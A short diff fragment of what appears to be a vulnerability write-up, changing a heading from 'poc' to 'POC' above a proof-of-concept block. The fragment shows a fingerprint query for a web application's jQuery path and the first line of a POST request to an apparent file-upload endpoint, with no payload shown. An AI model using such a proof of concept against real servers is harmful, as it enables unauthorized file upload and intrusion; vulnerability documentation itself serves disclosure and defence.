@@ -8,7 +8,7 @@
 body="/Mao_Public/js/jquery-2.1.1.min.js"
 ```
 
-## poc
+## POC
 
 ```java
 POST /api/api.php?mod=upload&type=1 HTTP/1.1
